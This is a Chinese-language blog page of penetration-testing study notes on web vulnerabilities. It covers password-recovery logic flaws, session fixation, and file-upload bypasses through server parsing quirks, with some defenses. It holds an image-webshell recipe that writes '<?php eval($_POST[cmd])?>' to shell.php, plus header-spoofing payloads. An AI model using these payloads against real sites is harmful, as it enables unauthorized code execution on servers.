<!DOCTYPE html>
<html lang="zh-CN">
    <head>
  <!-- 元数据 -->
  <meta charset="utf-8">
  <link rel="icon" href="">
  <title>WEB基础漏洞 | 10vexh's Blog.</title>
  <meta name="author" content="10vexh" />
  <meta http-equiv="Cache-Control" content="no-transform" />
  <meta http-equiv="Cache-Control" content="no-siteapp" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="robots" content="index,follow" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
  <meta name="format-detection" content="telphone=no, email=no" />
  
    <meta name="keywords" content="" />
  
  <meta name="description" content="WEB基础漏洞逻辑漏洞测试流程  1.正常找回密码 2.分析数据包 3.分析后台验证机制 4.修改数据包验证  漏洞点身份验证  暴力破解 弱加密 固定php中的session_id： ​    用户登录站点后得到了session，然后这个session被攻击者获取了，攻击者就直接利用这个session，伪造登录。 ​    获取方式：一般通过爆破，预测，窃取等方式来获取这个session。 ​">
<meta property="og:type" content="article">
<meta property="og:title" content="WEB基础漏洞">
<meta property="og:url" content="http://10vexh.github.io/2022/03/17/WEB%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/index.html">
<meta property="og:site_name" content="10vexh&#39;s Blog.">
<meta property="og:description" content="WEB基础漏洞逻辑漏洞测试流程  1.正常找回密码 2.分析数据包 3.分析后台验证机制 4.修改数据包验证  漏洞点身份验证  暴力破解 弱加密 固定php中的session_id： ​    用户登录站点后得到了session，然后这个session被攻击者获取了，攻击者就直接利用这个session，伪造登录。 ​    获取方式：一般通过爆破，预测，窃取等方式来获取这个session。 ​">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://10vexh.github.io/null">
<meta property="article:published_time" content="2022-03-17T15:15:52.000Z">
<meta property="article:modified_time" content="2022-05-20T14:50:39.213Z">
<meta property="article:author" content="10vexh">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://10vexh.github.io/null">
<meta name="twitter:site" content="@null">
  
  <!-- 站点验证相关 -->
  
    
    
    
  
  <!-- 样式表文件 -->
  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" type="text/css" media="all">
  
    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night-eighties.min.css" type="text/css" media="all">
  
  
  <link rel="stylesheet" id="fontawe-css" href="https://unpkg.com/font-awesome@4.7.0/css/font-awesome.min.css" type="text/css" media="all">
  <link rel="stylesheet" id="nprogress-css" href="https://unpkg.com/nprogress@0.2.0/nprogress.css" type="text/css" media="all">
  
  
    <link rel="stylesheet" href="https://unpkg.com/aplayer@1.10.1/dist/APlayer.min.css">
  
  
    <link rel="stylesheet" href="https://unpkg.com/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
  
  
    <link rel="stylesheet" id="darkmode-css" href="/css/kr-dark.min.css" type="text/css" media="all">
  
  <!-- 不得不预先加载的一些JS文件 -->
  <script src="https://unpkg.com/jquery@3.6.0/dist/jquery.min.js"></script>
  
    <script src="https://unpkg.com/qrcode_js@1.0.0/qrcode.min.js"></script>
  
  
  <style>
    
      .kratos-cover.kratos-cover-2 {
        background-image: url('/images/banner.webp');
      }
    
    
      @media(min-width:768px) {
        body.custom-background {
          background-image: url('/images/bg.webp');
        }
      }
    
  </style>
  
<meta name="generator" content="Hexo 6.0.0"></head>


    <body class="custom-background">
        <div id="kratos-wrapper">
    <div id="kratos-page">
        <div id="kratos-header">
            <header id="kratos-desktop-topnav" class="kratos-topnav">
                <div class="container">
                    <div class="nav-header">
                        <nav id="kratos-menu-wrap">
                            <ul id="kratos-primary-menu" class="sf-menu">
                                
                                    
                                        <li><a href="/"><i class="fa fa-home"></i>首页</a></li>
                                    
                                
                                    
                                        <li><a href="/archives/"><i class="fa fa-file"></i>档案馆</a></li>
                                    
                                
                                    
                                        <li><a href="/friends/"><i class="fa fa-paw"></i>好伙伴</a></li>
                                    
                                
                                    
                                        <li>
                                            <a><i class="fa fa-link"></i>链接</a>
                                            <ul class="sub-menu">
                                                
                                                    
                                                
                                                    
                                                        <li><a target="_blank" rel="noopener" href="https://candinya.com">作者博客</a></li>
                                                    
                                                
                                                    
                                                        <li><a target="_blank" rel="noopener" href="https://github.com/Candinya/Kratos-Rebirth">项目链接</a></li>
                                                    
                                                
                                            </ul>
                                        </li>
                                    
                                
                            </ul>
                        </nav>
                    </div>
                </div>
            </header>
            <header id="kratos-mobile-topnav" class="kratos-topnav">
                <div class="container">
                    <div class="color-logo"><a href="/">10vexh&#39;s Blog.</a></div>
                    <div class="nav-toggle">
                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
                            <i></i>
                        </a>
                    </div>
                </div>
            </header>
        </div>
        <div class="kratos-start kratos-hero-2">
            <!-- <div class="kratos-overlay"></div> -->
            <div class="kratos-cover kratos-cover-2 text-center">
                <div class="desc desc2 animate-box">
                    <a href="/">
                        <h2>10vexh&#39;s Blog.</h2> <br />
                        <span></span>
                    </a>
                </div>
            </div>
        </div>

        <div id="kratos-blog-post">
            <div class="container">
                <div id="main" class="row">
                    

        

            <section class="col-md-8">

        

            <article>
    <div class="kratos-hentry kratos-post-inner clearfix">
        <header class="kratos-entry-header">
            
                <h1 class="kratos-entry-title text-center">WEB基础漏洞</h1>
            
            
            <ul class="kratos-post-meta text-center">
                <li><i class="fa fa-calendar"></i> 2022-03-17</li>
                <li><i class="fa fa-user"></i> 作者 10vexh</li>
                <li>
                    <i class="fa fa-edit"></i> 
                    
                    
                        ~1.78K
                    
                    字
                </li>
                
            </ul>
        </header>
        <div class="kratos-post-content">
            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
                本文最后编辑于 <time datetime="1653058239213"></time> 前，其中的内容可能需要更新。
            </div>
            
                <div class="kratos-post-inner-toc">
                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">WEB基础漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.</span> <span class="toc-text">逻辑漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="toc-number">1.1.1.</span> <span class="toc-text">漏洞点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.2.</span> <span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.1.</span> <span class="toc-text">解析攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90"><span class="toc-number">1.2.2.</span> <span class="toc-text">中间件解析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Apache%EF%BC%9A%E4%BB%8E%E5%8F%B3%E5%BE%80%E5%B7%A6"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">Apache：从右往左</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Nginx%EF%BC%9A-00%E6%88%AA%E6%96%AD"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">Nginx：%00截断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IIS6-0%EF%BC%9A%E7%9B%AE%E5%BD%95%E8%A7%A3%E6%9E%90%EF%BC%8C%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">IIS6.0：目录解析，文件解析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IIS7-0-7-5-Nginx-lt-8-03%EF%BC%9AFast-CGI-php"><span class="toc-number">1.2.2.4.</span> <span class="toc-text">IIS7.0&#x2F;7.5 Nginx&lt;8.03：Fast-CGI *&#x2F;*.php*</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.3.</span> <span class="toc-text">上传漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%A7%A3%E6%9E%90%EF%BC%88javascript%EF%BC%89"><span class="toc-number">1.2.3.0.1.</span> <span class="toc-text">客户端解析（javascript）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%A7%A3%E6%9E%90"><span class="toc-number">1.2.3.0.2.</span> <span class="toc-text">服务端解析</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#MIME%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.2.3.0.2.1.</span> <span class="toc-text">MIME类型</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E8%B7%AF%E5%BE%84"><span class="toc-number">1.2.3.0.2.2.</span> <span class="toc-text">目录路径</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%8B%93%E5%B1%95%E5%90%8D"><span class="toc-number">1.2.3.0.2.3.</span> <span class="toc-text">文件拓展名</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9"><span class="toc-number">1.2.3.0.2.4.</span> <span class="toc-text">文件内容</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.3.</span> <span class="toc-text">文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E9%85%8D%E7%BD%AE"><span class="toc-number">1.3.1.</span> <span class="toc-text">相关配置</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#magic-quotes-gpc"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">magic_quotes_gpc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#allow-url-fopen"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">allow_url_fopen</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#allow-url-include"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">allow_url_include</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.2.</span> <span class="toc-text">相关函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LFI"><span class="toc-number">1.3.3.</span> <span class="toc-text">LFI</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8C%85%E5%90%AB%E4%B8%80%E4%BA%9B%E6%95%8F%E6%84%9F%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">1.3.3.1.1.</span> <span class="toc-text">包含一些敏感的配置文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8C%85%E5%90%AB%E7%94%A8%E6%88%B7%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6"><span class="toc-number">1.3.3.1.2.</span> <span class="toc-text">包含用户上传文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6"><span class="toc-number">1.3.3.1.3.</span> <span class="toc-text">包含日志文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8C%85%E5%90%ABSession"><span class="toc-number">1.3.3.1.4.</span> <span class="toc-text">包含Session</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6"><span class="toc-number">1.3.3.1.5.</span> <span class="toc-text">包含临时文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8C%85%E5%90%AB%E6%95%B0%E6%8D%AE%E5%BA%93%E3%80%81%E7%BC%93%E5%AD%98%E6%96%87%E4%BB%B6"><span class="toc-number">1.3.3.1.6.</span> <span class="toc-text">包含数据库、缓存文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8C%85%E5%90%AB-proc-self-environ"><span class="toc-number">1.3.3.1.7.</span> <span class="toc-text">包含&#x2F;proc&#x2F;self&#x2F;environ</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#file"><span class="toc-number">1.3.3.2.1.</span> <span class="toc-text">file:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#php"><span class="toc-number">1.3.3.2.2.</span> <span class="toc-text">php:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#zip-amp-bzip2-amp-zlib"><span class="toc-number">1.3.3.2.3.</span> <span class="toc-text">zip:&#x2F;&#x2F;&amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#phar"><span class="toc-number">1.3.3.2.4.</span> <span class="toc-text">phar:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#data"><span class="toc-number">1.3.3.2.5.</span> <span class="toc-text">data:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#http-amp-https"><span class="toc-number">1.3.3.2.6.</span> <span class="toc-text">http:&#x2F;&#x2F; &amp; https:&#x2F;&#x2F;</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RFI"><span class="toc-number">1.3.4.</span> <span class="toc-text">RFI</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.4.</span> <span class="toc-text">代码执行&#x2F;命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">1.4.1.</span> <span class="toc-text">代码执行</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">漏洞原理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.4.2.</span> <span class="toc-text">命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-1"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">漏洞原理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLI"><span class="toc-number">1.5.</span> <span class="toc-text">SQLI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.5.1.</span> <span class="toc-text">数据库类型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MySQL"><span class="toc-number">1.5.1.1.</span> <span class="toc-text">MySQL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PostgreSQL"><span class="toc-number">1.5.1.2.</span> <span class="toc-text">PostgreSQL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MongoDB"><span class="toc-number">1.5.1.3.</span> <span class="toc-text">MongoDB</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.5.2.</span> <span class="toc-text">注入类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4"><span class="toc-number">1.5.3.</span> <span class="toc-text">防护</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E8%BF%87%E6%BB%A4"><span class="toc-number">1.5.3.1.</span> <span class="toc-text">参数过滤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%84%E7%BC%96%E8%AF%91"><span class="toc-number">1.5.3.2.</span> <span class="toc-text">预编译</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ODBC"><span class="toc-number">1.5.3.3.</span> <span class="toc-text">ODBC</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PDO"><span class="toc-number">1.5.3.4.</span> <span class="toc-text">PDO</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF"><span class="toc-number">1.6.</span> <span class="toc-text">CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.6.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4-1"><span class="toc-number">1.6.2.</span> <span class="toc-text">防护</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF"><span class="toc-number">1.7.</span> <span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">1.7.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4-2"><span class="toc-number">1.7.2.</span> <span class="toc-text">防护</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS"><span class="toc-number">1.8.</span> <span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-number">1.8.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E7%B1%BB"><span class="toc-number">1.8.2.</span> <span class="toc-text">分类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4-3"><span class="toc-number">1.8.3.</span> <span class="toc-text">防护</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE"><span class="toc-number">1.9.</span> <span class="toc-text">XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-3"><span class="toc-number">1.9.1.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%B1%E5%AE%B3"><span class="toc-number">1.9.1.1.</span> <span class="toc-text">危害</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4-4"><span class="toc-number">1.9.1.2.</span> <span class="toc-text">防护</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSTI"><span class="toc-number">1.10.</span> <span class="toc-text">SSTI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JSONP"><span class="toc-number">1.11.</span> <span class="toc-text">JSONP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SOME%E6%94%BB%E5%87%BB"><span class="toc-number">1.11.1.</span> <span class="toc-text">SOME攻击</span></a></li></ol></li></ol></li></ol>
                </div>
            
            <hr />
            <h1 id="WEB基础漏洞"><a href="#WEB基础漏洞" class="headerlink" title="WEB基础漏洞"></a>WEB基础漏洞</h1><h2 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h2><p>测试流程</p>
<blockquote>
<p>1.正常找回密码</p>
<p>2.分析数据包</p>
<p>3.分析后台验证机制</p>
<p>4.修改数据包验证</p>
</blockquote>
<h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>身份验证</p>
<blockquote>
<p>暴力破解</p>
<p>弱加密</p>
<p>固定php中的session_id：</p>
<p>​    用户登录站点后得到了session，然后这个session被攻击者获取了，攻击者就直接利用这个session，伪造登录。</p>
<p>​    获取方式：一般通过爆破，预测，窃取等方式来获取这个session。</p>
<p>​    防御方式：更改Session名称，一般默认的是PHPSESSID，如果被修改了没猜到就无法进行破解。关闭透明化Session ID。设置HttpOnly。 关闭所有phpinfo类dump request信息的页面。验证HTTP头部信息。</p>
<p>可破解cookie：和session类似</p>
</blockquote>
<p>业务一致性</p>
<blockquote>
<p>手机号/id/邮箱/订单号篡改</p>
</blockquote>
<p>业务数据篡改</p>
<p>业务授权</p>
<p>用户凭证</p>
<blockquote>
<p>有效性：</p>
<p>验证码手机号不关联</p>
<p>邮件username未验证</p>
<p>步骤缺乏中间验证</p>
<p>暴力破解：</p>
<p>邮箱弱token时间戳生成</p>
<p>4/6位验证码不失效，无限制次数</p>
</blockquote>
<p>密码找回返回凭证</p>
<blockquote>
<p>url返回验证码及token</p>
<p>response中有token</p>
<p>response中返回短信验证码</p>
</blockquote>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="解析攻击"><a href="#解析攻击" class="headerlink" title="解析攻击"></a>解析攻击</h3><blockquote>
<p>直接解析：上传一句话木马后直接解析</p>
<p>本地文件包含：正常传一个图片马，然后如果存在漏洞则可以被包含木马，然后jpg被解析成php然后利用。</p>
<p>.htaccess解析：我们通过上传一个.htaccess文件，令Apache把所有的.xxx文件都解析为php文件。</p>
</blockquote>
<h3 id="中间件解析"><a href="#中间件解析" class="headerlink" title="中间件解析"></a>中间件解析</h3><h4 id="Apache：从右往左"><a href="#Apache：从右往左" class="headerlink" title="Apache：从右往左"></a>Apache：从右往左</h4><p>攻击：Apache是从右到左开始判断解析，如果为不可识别解析，就再往左判断。比如xxx.php.rar对apache来说rar是不可解析的，所以就会解析成xxx.php</p>
<p>如何防御：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">对apache的配置文件做适当修改，在文件中添加下面几行代码</span><br><span class="line"></span><br><span class="line">&lt;FilesMatch “.(php.|php3.|php4.|php5.)”&gt;</span><br><span class="line"></span><br><span class="line">Order Deny,Allow</span><br><span class="line"></span><br><span class="line">Deny from all</span><br><span class="line"></span><br><span class="line">禁止*.php.*文件的访问权限</span><br></pre></td></tr></table></figure>

<h4 id="Nginx：-00截断"><a href="#Nginx：-00截断" class="headerlink" title="Nginx：%00截断"></a>Nginx：%00截断</h4><p><code>%00</code> 是<code>urlencode</code>之后的值，decode 之后是个字符串，但会导致解析扩展名时失败。比如文件名改成<code>abc.php%00</code>，会使得无法正确识别出<code>php</code>的后缀。</p>
<h4 id="IIS6-0：目录解析，文件解析"><a href="#IIS6-0：目录解析，文件解析" class="headerlink" title="IIS6.0：目录解析，文件解析"></a>IIS6.0：目录解析，文件解析</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41210745/article/details/103423327">https://blog.csdn.net/qq_41210745/article/details/103423327</a></p>
<p>​    文件解析：</p>
<p>​        在已经启动的网站下文件夹的名为 .asp、.asa 、.cer的文件夹，其目录内的任何扩展名的文件都被IIS当作asp文件来解析并执行</p>
<p>​        IIS6.0下，分号后面的不被解析，也就是说mst.asp;.jpg会被服务器看成是mst.asp</p>
<p>目录解析：    </p>
<p>​        在web目录下，”;” “.” “/“均可以当做截断，IIS6.0只解析这些符号前面的可解析文件</p>
<p>漏洞防御：</p>
<p><em><strong>*目录解析漏洞*</strong></em></p>
<p>禁止在网站目录下创建目录，或者创建目录名规则中禁止含符号”.”</p>
<p><em><strong>*文件解析漏洞*</strong></em></p>
<p>对文件名命名进行限制、过滤，如：*/*.asp/<em>、</em>*.asp*等方式，</p>
<p>限制上传脚本文件的执行权限</p>
<h4 id="IIS7-0-7-5-Nginx-lt-8-03：Fast-CGI-php"><a href="#IIS7-0-7-5-Nginx-lt-8-03：Fast-CGI-php" class="headerlink" title="IIS7.0/7.5 Nginx&lt;8.03：Fast-CGI */*.php*"></a>IIS7.0/7.5 Nginx&lt;8.03：Fast-CGI */*.php*</h4><p>​        在默认Fast-CGI开启状况下,在一个文件路径(/xx.jpg)后面加上/xx.php会将 /xx.jpg/xx.php 解析为 php 文件。</p>
<blockquote>
<p>在默认Fast-CGI开启状况下,在一个文件路径(/xx.jpg)后面加上/xx.php会将 /xx.jpg/xx.php 解析为 php 文件。</p>
<p>常用利用方法： 将一张图和一个写入后门代码的文本文件合并 将恶意文本写入图片的二进制代码之后，避免破坏图片文件头和尾</p>
<p>e.g. copy xx.jpg/b + yy.txt/a xy.jpg</p>
<p>######################################</p>
<p>/b 即二进制[binary]模式</p>
<p>/a 即ascii模式 xx.jpg正常图片文件</p>
<p>yy.txt 内容 <?PHP fputs(fopen(‘shell.php’,'w’),’<?php eval($_POST[cmd])?>’);?&gt;</p>
<p>意思为写入一个内容为 <?php eval($_POST[cmd])?> 名称为shell.php的文件</p>
<p>######################################</p>
<p>找个地方上传 xy.jpg ,然后找到 xy.jpg 的地址，在地址后加上 /xx.php 即可执行恶意文本。</p>
<p>然后就在图片目录下生成一句话木马 shell.php 密码 cmd</p>
</blockquote>
<p>在Fast-CGI关闭的情况下，Nginx &lt;=0.8.37 依然存在解析漏洞</p>
<blockquote>
<p>在一个文件路径(/xx.jpg)后面加上%00.php会将 /xx.jpg%00.php 解析为 php 文件。</p>
</blockquote>
<h3 id="上传漏洞"><a href="#上传漏洞" class="headerlink" title="上传漏洞"></a>上传漏洞</h3><h5 id="客户端解析（javascript）"><a href="#客户端解析（javascript）" class="headerlink" title="客户端解析（javascript）"></a>客户端解析（javascript）</h5><p>​        一般在上传的界面有专门进行检测文件上传的JavaScript代码。</p>
<p>​        比如检测拓展名是否合法。</p>
<p>​        我们可以通过burpsuite抓包观察，只选择文件，未点击上传时，就有警告框，证明流量未经过burpsuite只在前端处理。这就很可能是客户端JavaScript检测。</p>
<p>​        用firebug禁用js脚本或者burp拦截修改(Content-Length要看情况修改）都可以绕过。</p>
<h5 id="服务端解析"><a href="#服务端解析" class="headerlink" title="服务端解析"></a>服务端解析</h5><h6 id="MIME类型"><a href="#MIME类型" class="headerlink" title="MIME类型"></a>MIME类型</h6><pre><code>     服务端MIME类型检测是通过检查http包的Content-Type字段中的值来判断上传文件是否合法的。
</code></pre>
<p>​         常见的MIME类型比如有text/html，image/jpeg，application/json等等，我们可以先传一个正常的php文件，通过抓包更改他的Content-Type字段，改成可以通过的字段，然后放包进行成功的注入。</p>
<h6 id="目录路径"><a href="#目录路径" class="headerlink" title="目录路径"></a>目录路径</h6><p>​    00截断可以绕过。</p>
<p>当php版本&lt;5.3.4时，</p>
<p><code>$_GET[“filename”]</code> 这样就可以接收到这样的请求，<code>filename=test.php%00.txt</code></p>
<p>实际得到的是 <code>test.php</code></p>
<h6 id="文件拓展名"><a href="#文件拓展名" class="headerlink" title="文件拓展名"></a>文件拓展名</h6><p>黑名单：</p>
<p>1、利用文件名大小写绕过Php这样。</p>
<p>2、名单列表绕过。（asa这种不在黑名单里面的时候可以绕）</p>
<p>3、特殊文件名绕过。</p>
<p>​    先发一个文件名为<code>test.php</code>，然后<code>burpsuite</code>抓包修改为<code>test.php_</code>，由于这种命名规则不被<code>Windows</code>允许，因此会被<code>Windows</code>自动去掉，形成绕过。</p>
<p>（Unix/Linux系统没有这个特性。）</p>
<p>4、<code>0x00</code>截断绕过</p>
<p>​    <code>asp</code>存在</p>
<p>5、<code>.htaccess</code>文件攻击</p>
<p>6、解析漏洞绕过</p>
<p>​    图片马。</p>
<p>白名单：相对来说安全</p>
<h6 id="文件内容"><a href="#文件内容" class="headerlink" title="文件内容"></a>文件内容</h6><p>文件幻数</p>
<p>检测文件内容开始处的文件幻数，比如图片类型的文件幻数。</p>
<p>png头改成<code>89 50 4E 47</code></p>
<p>文件相关信息</p>
<p><code>getimagesize()</code>函数绕过</p>
<p>伪造文件头部分</p>
<blockquote>
<p>GIF89a</p>
<p>(…some binary data for image…)</p>
<?php phpinfo();?>

<p>(…skipping there of binary data …)</p>
</blockquote>
<p>文件加载</p>
<p>​        调用API或者函数去进行文件加载测试</p>
<p>​        图像渲染测试或者二次渲染</p>
<blockquote>
<p>对渲染/加载测试的攻击方式是代码注入绕过（用winhex制作图片木马）</p>
<p>对二次渲染的攻击方式是攻击文件加载器自身</p>
</blockquote>
<p>二次渲染一般是调用PHP 的GD库</p>
<p>有一个<a target="_blank" rel="noopener" href="https://link.jianshu.com/?t=http://wiki.ioin.in/soft/detail/1q">绕过GD库的Webshell生成器</a></p>
